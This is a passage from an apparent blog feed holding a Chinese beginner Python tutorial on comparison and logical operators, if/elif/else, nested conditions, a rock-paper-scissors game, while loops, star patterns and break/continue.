调用主程序main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python基础02-选择和循环语句</title>
      <link href="/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8002-%E9%80%89%E6%8B%A9%E5%92%8C%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/"/>
      <url>/2020/07/26/2020-07-27-python%E5%9F%BA%E7%A1%8002-%E9%80%89%E6%8B%A9%E5%92%8C%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="选择和循环语句"><a href="#选择和循环语句" class="headerlink" title="选择和循环语句"></a>选择和循环语句</h1><h2 id="一、比较和逻辑运算符"><a href="#一、比较和逻辑运算符" class="headerlink" title="一、比较和逻辑运算符"></a>一、比较和逻辑运算符</h2><h3 id="1-比较-即关系，条件-运算符"><a href="#1-比较-即关系，条件-运算符" class="headerlink" title="1. 比较(即关系，条件)运算符"></a>1. 比较(即关系，条件)运算符</h3><a id="more"></a><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">==</td><td align="left">检查两个操作数的值是否相等，如果是则条件变为真。</td><td align="left">如a=3,b=3，则（a == b) 为 True</td></tr><tr><td align="left">!=</td><td align="left">检查两个操作数的值是否相等，如果值不相等，则条件变为真。</td><td align="left">如a=1,b=3，则(a != b) 为 True</td></tr><tr><td align="left">&gt;</td><td align="left">检查左操作数的值是否大于右操作数的值，如果是，则条件成立。</td><td align="left">如a=7,b=3，则(a &gt; b) 为 True</td></tr><tr><td align="left">&lt;</td><td align="left">检查左操作数的值是否小于右操作数的值，如果是，则条件成立。</td><td align="left">如a=7,b=3，则(a &lt; b) 为 False</td></tr><tr><td align="left">&gt;=</td><td align="left">检查左操作数的值是否大于或等于右操作数的值，如果是，则条件成立。</td><td align="left">如a=3,b=3，则(a &gt;= b) 为 True</td></tr><tr><td align="left">&lt;=</td><td align="left">检查左操作数的值是否小于或等于右操作数的值，如果是，则条件成立。</td><td align="left">如a=3,b=3，则(a &lt;= b) 为 True</td></tr></tbody></table><p>示例代码：</p><pre><code class="python">num1 = 15num2 = 20# == 等于：表示左右两个操作数是否相等print(num1 == num2)  # 打印结果为：False# != 不等于print(num1 != num2)  # 打印结果为：True# &lt; 小于print(num1 &lt; num2)  # 打印结果为：True# &gt;= 大于等于: num1 大于 或者 等于 num2 ，条件都成立print(num1 &gt;= num2)  # 打印结果为：False# &lt;= 小于等于： num1 小于 或者 等于 num2 ，条件都成立print(num1 &lt;= num2)  # 打印结果为：True</code></pre><h3 id="2-逻辑运算符"><a href="#2-逻辑运算符" class="headerlink" title="2. 逻辑运算符"></a>2. 逻辑运算符</h3><table><thead><tr><th align="left">运算符</th><th>逻辑表达式</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">and</td><td>x and y</td><td align="left">布尔”与”：如果 x 为 False，x and y 返回 False，否则它返回 y 的值。</td><td align="left">True and False， 返回 False。</td></tr><tr><td align="left">or</td><td>x or y</td><td align="left">布尔”或”：如果 x 是 True，它返回 True，否则它返回 y 的值。</td><td align="left">False or True， 返回 True。</td></tr><tr><td align="left">not</td><td>not x</td><td align="left">布尔”非”：如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td><td align="left">not True 返回 False, not False 返回 True</td></tr></tbody></table><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;and: 并且， 左右2边都为True，结果才为Trueor:  或者， 只有有1个为True，结果为Truenot: 非，取反，原来是True就变成False&quot;&quot;&quot;# 左右2边都为True，结果才为Trueprint(True and True)# 5&gt;3 为True,  4 &lt; 3为False， 整体为Falseprint(5 &gt; 3 and 4 &lt; 3)print(True or False)# 1 == 1 为True, 结果就为Trueprint(1 == 1 or 1 &gt; 3)print(not True)# 1 == 1为True, 加上not，变成Falseprint( not (1 == 1) )</code></pre><h2 id="二、if-语句的基本格式"><a href="#二、if-语句的基本格式" class="headerlink" title="二、if 语句的基本格式"></a>二、if 语句的基本格式</h2><h3 id="1-if-选择语句基本格式"><a href="#1-if-选择语句基本格式" class="headerlink" title="1. if 选择语句基本格式"></a>1. if 选择语句基本格式</h3><ul><li>if 语句是用来进行选择判断的，其使用格式如下：</li></ul><pre><code class="python">if 要判断的条件:    条件满足时，要做的事情    ……</code></pre><ul><li>注意：<ul><li>判断的条件结果为 True 时，才会执行 if 里面的代码块</li><li>代码的<strong>缩进</strong>为一个 <code>tab</code> 键，或者 <strong>4</strong> 个空格</li><li>只要缩进一个 <code>tab</code> 键里面的代码，都属于 if 语句里面的代码块</li></ul></li></ul><h3 id="2-案例演练：选择年龄"><a href="#2-案例演练：选择年龄" class="headerlink" title="2. 案例演练：选择年龄"></a>2. 案例演练：选择年龄</h3><p><strong>需求</strong></p><ol><li>定义一个变量 age，保存年龄</li><li>if 判断条件(判断是否满 18 岁)</li><li>满足条件，打印一句话：允许进网吧嗨皮</li></ol><p>示例代码：</p><pre><code class="python">print(&#39;if的前面&#39;)# 1. 定义一个变量age，保存年龄age = 19# 2. if 判断条件(判断是否满 18 岁)if age &gt;= 18:    # 3. 满足条件，打印一句话：允许进网吧嗨皮    print(&#39;允许进网吧嗨皮&#39;)# 不属于if的，可以无条件执行print(&#39;if执行完毕&#39;)</code></pre><p>运行结果:</p><pre><code class="shell">if的前面允许进网吧嗨皮if执行完毕</code></pre><h2 id="三、if-else-语句格式"><a href="#三、if-else-语句格式" class="headerlink" title="三、if-else 语句格式"></a>三、if-else 语句格式</h2><h3 id="1-else-处理条件不满足的情况"><a href="#1-else-处理条件不满足的情况" class="headerlink" title="1. else 处理条件不满足的情况"></a>1. else 处理条件不满足的情况</h3><ul><li>思考：在使用 if 的时候，它只能做到满足条件时要做的事情。那万一需要在不满足条件的时候，做某些事，该怎么办呢？</li><li>答：使用 if-else</li></ul><h3 id="2-if-else的语法格式"><a href="#2-if-else的语法格式" class="headerlink" title="2. if-else的语法格式"></a>2. if-else的语法格式</h3><pre><code class="python">if 要判断的条件:    条件满足时，要做的事情    ……else:    条件不满足时，要做的事情    ……</code></pre><h3 id="3-案例演练：判断年龄改进"><a href="#3-案例演练：判断年龄改进" class="headerlink" title="3. 案例演练：判断年龄改进"></a>3. 案例演练：判断年龄改进</h3><p><strong>需求</strong></p><pre><code class="python">1. 输入用户年龄，input返回值是字符串，类型转换为int2. if 判断是否满 18 岁：    2.1 如果满 18 岁，打印一句话：允许进网吧嗨皮3. 否则，未满 18 岁：    3.1 打印一句话：提示回家写作业</code></pre><p>示例代码：</p><pre><code class="python"># 1. 输入用户年龄，input返回值是字符串，类型转换为intage = int(input(&#39;输入用户年龄: &#39;))# 2. if 判断是否满 18 岁:if age &gt;= 18:    # 2.1 如果满 18 岁，打印一句话：允许进网吧嗨皮    print(&#39;允许进网吧嗨皮&#39;)# 3. 否则，未满 18 岁else:    # 3.1 打印一句话：提示回家写作业    print(&#39;回家写作业&#39;)</code></pre><p>运行结果：</p><pre><code class="shell">输入用户年龄: 12回家写作业</code></pre><h3 id="4-if-实现三目运算操作"><a href="#4-if-实现三目运算操作" class="headerlink" title="4. if 实现三目运算操作"></a>4. if 实现三目运算操作</h3><ul><li><p>三目运算符：简洁版if-else语句</p></li><li><pre><code>a if a &gt; b else b</code></pre><ul><li>如果 a &gt; b的条件成立，三目运算的结果是a，否则就是b</li></ul></li></ul><pre><code class="python"># 需求：通过if-else求2个数的最大值# 1. 定义2个变量，赋值a = 10b = 20# 2. if 用大于比较2个变量大小：if a &gt; b:    #  2.1 如果满足条件，把大的那个数保存    _max = a# 3. 否则，不满足条件：else:    #  3.1 把小的那个数保存    _max = b# 4. if 语句的外面，打印最大值print(_max)# 重新给a, b赋值a = 10b = 20# 通过 三目运算符实现 同样效果# 如果 a &gt; b的条件成立，三目运算的结果是a，否则就是b_max2 = a if a &gt; b else bprint(_max2)</code></pre><h2 id="四、if-elif-else-语句格式"><a href="#四、if-elif-else-语句格式" class="headerlink" title="四、if-elif-else 语句格式"></a>四、if-elif-else 语句格式</h2><h3 id="1-if-elif-else-语句格式"><a href="#1-if-elif-else-语句格式" class="headerlink" title="1. if-elif-else 语句格式"></a>1. if-elif-else 语句格式</h3><ul><li>一对 if 和 else 可以让代码执行出 <strong>两种不同的结果</strong></li><li>但开发中，可能希望 <strong>并列的执行出多种结果</strong>，这时就可以使用 <code>elif</code></li></ul><p>语法格式如下:</p><pre><code class="python">if 条件1：    满足条件1，执行的事情1elif 条件2：    满足条件2，执行的事情2elif 条件3：    满足条件3，执行的事情3else:    不满足上述条件，执行其它事情</code></pre><p>说明:</p><ul><li>条件<strong>从上往下</strong>判断</li><li><strong>只要满足一个条件</strong>，执行满足条件的代码块，<strong>其它条件不再</strong>判断执行</li></ul><h3 id="2-案例演练：女友的节日"><a href="#2-案例演练：女友的节日" class="headerlink" title="2. 案例演练：女友的节日"></a>2. 案例演练：女友的节日</h3><p><strong>需求</strong></p><ol><li>定义 <code>holiday_name</code> 字符串变量记录节日名称</li><li>如果是 <strong>情人节</strong> 应该 <strong>买玫瑰</strong>／<strong>看电影</strong></li><li>如果是 <strong>平安夜</strong> 应该 <strong>买苹果</strong>／<strong>吃大餐</strong></li><li>如果是 <strong>生日</strong> 应该 <strong>买蛋糕</strong></li><li>其他的日子每天都是节日啊……</li></ol><p>示例代码</p><pre><code class="Python">&quot;&quot;&quot;1. 定义 holiday_name 字符串变量记录节日名称2. if 判断是否为情人节：    2.1 如果是 情人节，打印： 买玫瑰／看电影3. elif 判断是否为平安夜:    3.1 如果是 平安夜，打印： 买苹果／吃大餐4. elif 判断是否为生日 :    4.1 如果是 生日，打印： 买蛋糕5. else 其它情况：    5.1 打印：每天都是节日啊……&quot;&quot;&quot;# 1. 定义 holiday_name 字符串变量记录节日名称holiday_name = &#39;情人节&#39;# 2. if 判断是否为情人节：#   是两个=，==，判断是否相等if holiday_name == &#39;情人节&#39;:    # 2.1 如果是 情人节，打印： 买玫瑰／看电影    print(&#39;买玫瑰／看电影&#39;)# 3. elif 判断是否为平安夜:elif holiday_name == &#39;平安夜&#39;:    # 3.1 如果是 平安夜，打印： 买苹果／吃大餐    print(&#39;买苹果／吃大餐&#39;)# 4. elif 判断是否为生日 :elif holiday_name == &#39;生日&#39;:    # 4.1 如果是 生日，打印： 买蛋糕    print(&#39;买蛋糕&#39;)# 5. else 其它情况：else:    # 5.1 打印：每天都是节日啊……    print(&#39;每天都是节日啊……&#39;)</code></pre><h2 id="五、if-嵌套"><a href="#五、if-嵌套" class="headerlink" title="五、if 嵌套"></a>五、if 嵌套</h2><h3 id="1-if-嵌套应用场景"><a href="#1-if-嵌套应用场景" class="headerlink" title="1. if 嵌套应用场景"></a>1. if 嵌套应用场景</h3><ul><li>坐火车或者地铁的实际情况是：<ul><li>先进行安检如果安检通过才会判断是否有车票，</li><li>或者是先检查是否有车票之后才会进行安检</li></ul></li><li>即实际的情况某个判断是再另外一个判断成立的基础上进行的，这样的情况该怎样解决呢？<ul><li>if 嵌套</li></ul></li></ul><h3 id="2-if-嵌套的格式"><a href="#2-if-嵌套的格式" class="headerlink" title="2. if 嵌套的格式"></a>2. if 嵌套的格式</h3><pre><code class="python">if 条件 1:    条件 1 满足执行的代码    ……    if 条件 1 基础上的条件 2:        条件 2 满足时，执行的代码        ……        # 条件 2 不满足的处理    else:        条件 2 不满足时，执行的代码# 条件 1 不满足的处理else:    条件1 不满足时，执行的代码    ……</code></pre><ul><li>if 嵌套：if 里面包含 if</li><li>满足外层if的条件，才执行判断内层的if</li></ul><h3 id="3-案例演练：车票刀具安检"><a href="#3-案例演练：车票刀具安检" class="headerlink" title="3. 案例演练：车票刀具安检"></a>3. 案例演练：车票刀具安检</h3><p><strong>需求</strong></p><ol><li>定义布尔型变量 <code>has_ticket</code> 表示是否有车票</li><li>定义整型变量 <code>knife_length</code> 表示刀的长度，单位：厘米</li><li>首先检查是否有车票，如果有，提示：有车票，即将进行下一步的刀具安检</li><li>安检时，需要检查刀的长度，判断是否超过 20 厘米<ul><li>如果超过 20 厘米，提示：刀的长度超过20厘米，不允许上车</li><li>如果不超过 20 厘米，安检通过</li></ul></li><li>如果没有车票，提示：大哥，您要先买票啊</li></ol><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;步骤流程：先写外层的if，再写内层的if外层 if 步骤流程：1. 定义布尔型变量 has_ticket，赋值为True表示有票2. if 判断是否有票：    2.1 如果有票，打印：有车票，即将进行下一步的刀具安检    2.2 内层if的处理(先空着，不处理)3. 否则，没有票    3.1 打印：大哥，您要先买票啊内层 if 步骤流程：a. 定义整型变量 knife_length 表示刀的长度，单位：厘米b. if 判断刀具长度是否超过20：    b.1 如果超过 20 厘米，打印：刀的长度超过20厘米，不允许上车c. 否则，不超过20厘米：    c.1 打印：安检通过，请上车&quot;&quot;&quot;# 外层 if# 1. 定义布尔型变量 has_ticket，赋值为True表示有票has_ticket = True# 2. if 判断是否有票：if has_ticket:    # 2.1 如果有票，打印：有车票，即将进行下一步的刀具安检    print(&#39;有车票，即将进行下一步的刀具安检&#39;)    # 2.2 内层 if 的处理    # a. 定义整型变量 knife_length 表示刀的长度，单位：厘米    knife_length = 22    # b. if 判断刀具长度是否超过20：    if knife_length &gt; 20:        # b.1 如果超过 20 厘米，打印：刀的长度超过20厘米，不允许上车        print(&#39;刀的长度超过20厘米，不允许上车&#39;)    # c. 否则，不超过20厘米：    else:        # c.1 打印：安检通过，请上车        print(&#39;安检通过，请上车&#39;)# 3. 否则，没有票else:    # 3.1 打印：大哥，您要先买票啊    print(&#39;大哥，您要先买票啊&#39;)</code></pre><h2 id="应用：猜拳游戏"><a href="#应用：猜拳游戏" class="headerlink" title="应用：猜拳游戏"></a>应用：猜拳游戏</h2><p>学习目标:</p><ul><li>强化 多个条件 的 逻辑运算</li><li>体会 import 导⼊模块（“⼯具包”）的使⽤</li></ul><hr><h3 id="1-案例需求"><a href="#1-案例需求" class="headerlink" title="1. 案例需求"></a>1. 案例需求</h3><ol><li>从控制台输⼊要出的拳 —— ⽯头（1）／剪⼑（2）／布（3）</li><li>电脑 随机 出拳 —— 先假定电脑只会出⽯头，完成整体代码功能</li><li>⽐较胜负</li></ol><table><thead><tr><th align="center">序号</th><th align="center">规则</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">石头 胜 剪刀</td></tr><tr><td align="center">2</td><td align="center">剪刀 胜 布</td></tr><tr><td align="center">3</td><td align="center">布 胜 石头</td></tr></tbody></table><h3 id="2-基础代码实现"><a href="#2-基础代码实现" class="headerlink" title="2. 基础代码实现"></a>2. 基础代码实现</h3><pre><code class="python">&quot;&quot;&quot;规则：石头 1， 剪刀 2， 布 3角色：用户user，电脑computer用户赢的情况：    user == 1 and computer == 2    user == 2 and computer == 3    user == 3 and computer == 1步骤流程：1. 用户输入数字：请输入（石头 1， 剪刀 2， 布 3）2. 电脑固定一个数字，假定只会出石头3. if 用户赢电脑的判断：    3.1 如果用户赢，打印：电脑弱爆了4. elif 平局：    4.1 打印：心有灵犀，再来一盘！5. 否则，电脑赢    5.1 打印：不行，我要和你决战到天亮！&quot;&quot;&quot;# 1. 用户输入数字user = int(input(&#39;请输入（石头 1， 剪刀 2， 布 3）：&#39;))# 2. 电脑固定一个数字，假定只会出石头computer = 3# 3. if 用户赢电脑的判断：if (user == 1 and computer == 2) or (user == 2 and computer == 3) or (user == 3 and computer == 1):    # 3.1 如果用户赢，打印：电脑弱爆了    print(&#39;电脑弱爆了&#39;)# 4. elif 平局：elif user == computer:    print(&#39;心有灵犀，再来一盘！&#39;)# 5. 否则，电脑赢else:    # 5.1 打印：不行，我要和你决战到天亮！    print(&#39;不行，我要和你决战到天亮！&#39;)</code></pre><h3 id="3-随机数的产生"><a href="#3-随机数的产生" class="headerlink" title="3. 随机数的产生"></a>3. 随机数的产生</h3><ul><li>在 <code>Python</code> 中，要使用随机数，首先需要导入 <strong>随机数</strong> 的 <strong>模块</strong> —— “工具包”</li></ul><pre><code class="python">import random</code></pre><ul><li>导入模块后，可以直接在 <strong>模块名称</strong> 后面敲一个 <code>.</code> 然后按 <code>Tab</code> 键，会提示该模块中包含的所有函数</li><li><code>random.randint(a, b)</code> ，返回 <code>[a, b]</code> 之间的整数，包含 <code>a</code> 和 <code>b</code></li><li>例如：</li></ul><pre><code class="python">&quot;&quot;&quot;功能：产生某个范围的随机数步骤流程：# 1. 导入模块，工具包，后面会学习# 2. 调用工具里面的函数，返回一个随机值&quot;&quot;&quot;# 1. 导入模块，工具包import random# 2. 调用工具里面的函数，返回一个随机值num = random.randint(1, 3)  # [1, 3]在1, 2, 3随机产出一个数print(num)</code></pre><h3 id="4-猜拳游戏完整代码"><a href="#4-猜拳游戏完整代码" class="headerlink" title="4. 猜拳游戏完整代码"></a>4. 猜拳游戏完整代码</h3><pre><code class="python">&quot;&quot;&quot;规则：石头 1， 剪刀 2， 布 3角色：用户user，电脑computer用户赢的情况：    user == 1 and computer == 2    user == 2 and computer == 3    user == 3 and computer == 1步骤流程：0. 导入模块1. 用户输入数字：请输入（石头 1， 剪刀 2， 布 3）2. 电脑 随机 出拳，即随机产生一个[1,3]范围的数3. if 用户赢电脑的判断：    3.1 如果用户赢，打印：电脑弱爆了4. elif 平局：    4.1 打印：心有灵犀，再来一盘！5. 否则，电脑赢    5.1 打印：不行，我要和你决战到天亮！&quot;&quot;&quot;# 0. 导入模块import random# 1. 用户输入数字user = int(input(&#39;请输入（石头 1， 剪刀 2， 布 3）：&#39;))# 2. 电脑 随机 出拳，即随机产生一个[1,3]范围的数computer = random.randint(1, 3)# 3. if 用户赢电脑的判断：if (user == 1 and computer == 2) or (user == 2 and computer == 3) or (user == 3 and computer == 1):    # 3.1 如果用户赢，打印：电脑弱爆了    print(&#39;电脑弱爆了&#39;)# 4. elif 平局：elif user == computer:    print(&#39;心有灵犀，再来一盘！&#39;)# 5. 否则，电脑赢else:    # 5.1 打印：不行，我要和你决战到天亮！    print(&#39;不行，我要和你决战到天亮！&#39;)</code></pre><h2 id="六、while循环"><a href="#六、while循环" class="headerlink" title="六、while循环"></a>六、while循环</h2><h3 id="1-while循环"><a href="#1-while循环" class="headerlink" title="1. while循环"></a>1. while循环</h3><h4 id="1-1-while循环的格式"><a href="#1-1-while循环的格式" class="headerlink" title="1.1 while循环的格式"></a>1.1 while循环的格式</h4><pre><code class="python">变量设置初始值while 条件(判断 变量是否满足条件):    条件满足时，做的事情1    ...(省略)...    修改变量</code></pre><ul><li>注意：<code>while</code> 语句中的缩进部分是一个 <strong>独立的代码块</strong></li></ul><h4 id="1-2-案例演练：循环跑步10圈"><a href="#1-2-案例演练：循环跑步10圈" class="headerlink" title="1.2 案例演练：循环跑步10圈"></a>1.2 案例演练：循环跑步10圈</h4><pre><code class="python">&quot;&quot;&quot;1. 定义一个条件变量，一般赋值为02. while 判断条件：    2.1 满足条件的代码块    2.2 条件变量的改变【非常重要】&quot;&quot;&quot;# 1. 定义一个条件变量，一般赋值为0i = 0# 2. while 判断条件：while i &lt; 10:    # 2.1 满足条件的代码块    print(&#39;跑步第%d圈&#39; % (i+1))    # 2.2 条件变量的改变【非常重要】    i += 1</code></pre><p>运行结果：</p><pre><code class="shell">跑步第1圈跑步第2圈跑步第3圈跑步第4圈跑步第5圈跑步第6圈跑步第7圈跑步第8圈跑步第9圈跑步第10圈</code></pre><h4 id="1-3-死循环"><a href="#1-3-死循环" class="headerlink" title="1.3 死循环"></a>1.3 死循环</h4><ul><li>条件永远为真的(<strong><code>True</code></strong>)循环即为死循环，也叫无限循环</li></ul><pre><code class="python">while True:    print(&#39;我会永远循环执行下去&#39;)</code></pre><h3 id="2-while循环的应用"><a href="#2-while循环的应用" class="headerlink" title="2. while循环的应用"></a>2. while循环的应用</h3><h4 id="2-1-计算1-100的累加和（包含1和100）"><a href="#2-1-计算1-100的累加和（包含1和100）" class="headerlink" title="2.1 计算1~100的累加和（包含1和100）"></a>2.1 计算1~100的累加和（包含1和100）</h4><pre><code class="python">&quot;&quot;&quot;核心代码分析：_sum = 0i = 1# 等价于 _sum += i_sum = sum+i  # _sum = 0+1i = 2_sum = _sum+i # _sum = 上一步_sum的内容 + 2 ==》 _sum = 0+1+2i = 3_sum = _sum+i # _sum = 上一步_sum的内容 + 3 ==》 _sum = 0+1+2+3步骤流程：1. 定义条件变量 i, 赋值为12. 定义一个辅助变量，用于保存累计的结果3. while 条件(i &lt;= 100)：    3.1 完成累加    3.2 条件变量改变4. 在循环的外面，打印最终的累加结果&quot;&quot;&quot;# 1. 定义条件变量 i, 赋值为1i = 1# 2. 定义一个辅助变量，用于保存累计的结果_sum = 0# 3. while 条件(i &lt;= 100)：while i &lt;= 100:    # 3.1 完成累加    _sum = _sum + i    # 3.2 条件变量改变    i += 1# 4. 在循环的外面，打印最终的累加结果print(&#39;_sum = %d&#39; % _sum)</code></pre><h4 id="2-2-计算1-100之间偶数的累加和"><a href="#2-2-计算1-100之间偶数的累加和" class="headerlink" title="2.2 计算1~100之间偶数的累加和"></a>2.2 计算1~100之间偶数的累加和</h4><pre><code class="python">&quot;&quot;&quot;判断一个变量是否为偶数：对2求余，余数为0即为偶数i = 4if i % 2 == 0：    print(&#39;偶数&#39;)步骤流程：1. 定义条件变量2. 设置辅助变量3. while 条件：    3.1 if 判断i是否为偶数        3.1.1 累加    3.2 条件变量的改变4. 循环外面，打印累加结果&quot;&quot;&quot;# 1. 定义条件变量i = 1# 2. 设置辅助变量_sum = 0# 3. while 条件：while i &lt;= 100:    # 3.1 if 判断i是否为偶数    if i % 2 == 0:        # 3.1.1 累加        _sum += i    # 3.2 条件变量的改变    i += 1# 4. 循环外面，打印累加结果print(&quot;sum = %d&quot; % _sum)</code></pre><h3 id="3-debug调试"><a href="#3-debug调试" class="headerlink" title="3. debug调试"></a>3. debug调试</h3><h4 id="3-1-操作流程"><a href="#3-1-操作流程" class="headerlink" title="3.1 操作流程"></a>3.1 操作流程</h4><ol><li>设置断点</li><li>调试运行</li><li>单步执行代码</li><li>观察变量变化<ul><li>重复步骤3、4，观察变量和程序执行流程</li><li>重复步骤3、4，观察变量和程序执行流程</li><li>重复步骤3、4，观察变量和程序执行流程</li></ul></li></ol><h2 id="七、while循环嵌套"><a href="#七、while循环嵌套" class="headerlink" title="七、while循环嵌套"></a>七、while循环嵌套</h2><h3 id="1-while嵌套的格式"><a href="#1-while嵌套的格式" class="headerlink" title="1. while嵌套的格式"></a>1. while嵌套的格式</h3><ul><li><code>while</code> 嵌套就是：<code>while</code> 里面还有 <code>while</code></li></ul><pre><code class="python">while 条件 1:    条件满足时，做的事情1    ...(省略)...    while 条件 2:        条件满足时，做的事情1        ...(省略)...        处理条件 2    处理条件 1</code></pre><ul><li>步骤流程：先写外层的while，再写内层的while</li></ul><h3 id="2-案例演练"><a href="#2-案例演练" class="headerlink" title="2. 案例演练"></a>2. 案例演练</h3><p>需求：跑步 5 圈，每跑步1圈，做10个俯卧撑</p><pre><code class="python">&quot;&quot;&quot;外层 while 步骤流程：1. 设置外层循环的条件变量 i， 赋值为02. 外层while 条件(i &lt; 5)：    3. 打印跑了第几圈    4. 做10个俯卧撑内循环处理(先空着，不处理)    5. 外层循环的条件变量改变内层 while 步骤流程：4.1 定义内层循环条件变量 j = 04.2 内层循环 while j &lt; 10:    4.3 打印第几个俯卧撑    4.4 内层循环的条件变量改变&quot;&quot;&quot;# 1. 设置外层循环的条件变量 i， 赋值为0i = 0# 2. 外层while 条件(i &lt; 5)：while i &lt; 5:    # 3. 打印跑了第几圈    print(&#39;跑步第 %d 圈&#39; % (i + 1))    # 4. 做10个俯卧撑    # 4.1 定义内层循环条件变量j = 0    j = 0    # 4.2 内层循环 while j &lt; 10:    while j &lt; 10:        # 4.3 打印第几个俯卧撑        print(&#39;第%d俯卧撑&#39; % (j + 1))        # 4.4 内层循环的条件变量改变        j += 1    # 5. 外层循环的条件变量改变    i += 1</code></pre><h3 id="3-while嵌套应用"><a href="#3-while嵌套应用" class="headerlink" title="3. while嵌套应用"></a>3. while嵌套应用</h3><h3 id="3-1-打印正方形"><a href="#3-1-打印正方形" class="headerlink" title="3.1 打印正方形"></a>3.1 打印正方形</h3><h4 id="3-1-1-通过循环打印1行星星"><a href="#3-1-1-通过循环打印1行星星" class="headerlink" title="3.1.1 通过循环打印1行星星"></a>3.1.1 通过循环打印1行星星</h4><p>要求：打印如下图形</p><pre><code class="shell">* * * * *</code></pre><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;步骤流程：1 定义循环条件变量 j = 02 循环 while j &lt; 5:    3 打印一个星星，end=&#39;&#39;作用指定不换行打印    4 循环的条件变量改变&quot;&quot;&quot;# 1 定义循环条件变量 j = 0j = 0# 2 循环 while j &lt; 5:while j &lt; 5:    # 3 打印一个星星，end=&#39;&#39;作用指定不换行打印    print(&#39;* &#39;, end=&#39;&#39;)    # 4 循环的条件变量改变    j += 1</code></pre><h4 id="3-1-2-通过循环嵌套打印正方形"><a href="#3-1-2-通过循环嵌套打印正方形" class="headerlink" title="3.1.2 通过循环嵌套打印正方形"></a>3.1.2 通过循环嵌套打印正方形</h4><p>要求：打印如下图形</p><pre><code>* * * * * * * * * * * * * * * * * * * * * * * * *</code></pre><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;外层 while 步骤流程：1. 定义外层循环的条件变量 i = 02. 外层while 条件(i &lt; 5)：    3. 内循环处理(先空着，不处理)    4. 单独打印空行    5. 外层循环的条件变量改变内层 while 步骤流程：3.1 定义内层循环条件变量 j = 03.2 内层循环 while j &lt; 5:    3.3 打印一个星星，end=&#39;&#39;作用指定不换行打印    3.4 内层循环的条件变量改变&quot;&quot;&quot;# 1. 定义外层循环的条件变量 i = 0i = 0# 2. 外层while 条件(i &lt; 5)：while i &lt; 5:    # 3. 内循环处理：打印一行星星    # 3.1 定义内层循环条件变量 j = 0    j = 0    # 3.2 内层循环 while j &lt; 5:    while j &lt; 5:        # 3.3 打印一个星星，end=&#39;&#39;作用指定不换行打印        print(&#39;* &#39;, end=&#39;&#39;)        # 3.4 内层循环的条件变量改变        j += 1    # 4. 单独打印空行    print()    # 5. 外层循环的条件变量改变    i += 1</code></pre><h4 id="3-2-打印三角形"><a href="#3-2-打印三角形" class="headerlink" title="3.2 打印三角形"></a>3.2 打印三角形</h4><p>要求：打印如下图形：</p><pre><code>* * * * * * * * * *  * * * * *</code></pre><p>示例代码：</p><pre><code class="python">&quot;&quot;&quot;外层 while 步骤流程：1. 定义外层循环的条件变量 i = 02. 外层while 条件(i &lt; 5)：    3. 内循环处理(先空着，不处理)    4. 单独打印空行    5. 外层循环的条件变量改变内层 while 步骤流程：第1次打印1个星，第2次打印2个星，如此内推3.1 定义内层循环条件变量 j = 03.2 内层循环 while j &lt; i+1:    3.3 打印一个星星，end=&#39;&#39;作用指定不换号打印    3.4 内层循环的条件变量改变&quot;&quot;&quot;# 1. 定义外层循环的条件变量 i = 0i = 0# 2. 外层 while 条件(i &lt; 5)：while i &lt; 5:    # 3. 内循环处理：第1次打印1个星，第2次打印2个星，如此内推    # 3.1 设置条件变量j = 0    j = 0    # 3.2 内层循环 while j &lt; i+1:    while j &lt; i + 1:        # 3.3 打印一个星星，end=&#39;&#39;作用指定不换行打印        print(&#39;* &#39;, end=&#39;&#39;)        # 3.4 内层循环的条件变量改变        j += 1    # 4. 单独打印空行    print()    # 5. 外层循环的条件变量改变    i += 1</code></pre><h2 id="八、break-、-continue和循环的else"><a href="#八、break-、-continue和循环的else" class="headerlink" title="八、break 、 continue和循环的else"></a>八、break 、 continue和循环的else</h2><h3 id="1-break-和-continue的作用"><a href="#1-break-和-continue的作用" class="headerlink" title="1. break 和 continue的作用"></a>1. break 和 continue的作用</h3><p><strong><code>break</code></strong> 和 <strong><code>continue</code></strong> 是专门在循环中使用的关键字</p><ul><li><code>break</code> <strong>跳出循环</strong>，不再执行循环体中后续重复的代码</li><li><code>continue</code> <strong>跳过循环</strong>，不再执行<strong>本次循环体</strong>中后续重复的代码，但进入下一次循环判断</li><li><code>break</code>/<code>continue</code>只能用在循环中，除此以外不能单独使用</li><li><code>break</code>/<code>continue</code>在嵌套循环中，只对<strong>最近的一层循环</strong>起作用(就近原则)</li></ul><h4 id="1-1-break"><a href="#1-1-break" class="headerlink" title="1.1 break"></a>1.1 break</h4><ul><li><strong>在循环过程中</strong>，如果 <strong>某一个条件满足后</strong>，<strong>不</strong> 希望 <strong>循环继续执行</strong>，可以使用 <code>break</code> 跳出循环</li></ul><p>需求：跑步10圈，跑5圈后，不再跑了</p><pre><code class="python">&quot;&quot;&quot;步骤流程：1. 定义一个条件变量，一般赋值为02. while 判断条件：    3. 满足条件的循环代码块    4. if 满足条件：        4.1 打印提示信息：累了，结束战斗        4.2 break跳出循环    5. 条件变量的改变【非常重要】&quot;&quot;&quot;# 1. 定义一个条件变量，一般赋值为0i = 0# 2. while 判断条件：while i &lt; 10:    # 3. 满足条件的循环代码块    print(&#39;跑步第%d圈&#39; % (i+1))    # 4. if 满足条件：    if i == 4:        # 4.1 打印提示信息        print(&#39;累了，结束战斗&#39;)        # 4.2 break跳出循环        break    # 5. 条件变量的改变【非常重要】    i += 1print(&#39;循环的外面&#39;)</code></pre><p>运行结果</p><pre><code class="python">跑步第1圈跑步第2圈跑步第3圈跑步第4圈跑步第5圈累了，结束战斗循环的外面</code></pre><h4 id="1-2-continue"><a href="#1-2-continue" class="headerlink" title="1.2 continue"></a>1.2 continue</h4><ul><li><strong>在循环过程中</strong>，如果 <strong>某一个条件满足后</strong>，<strong>不</strong> 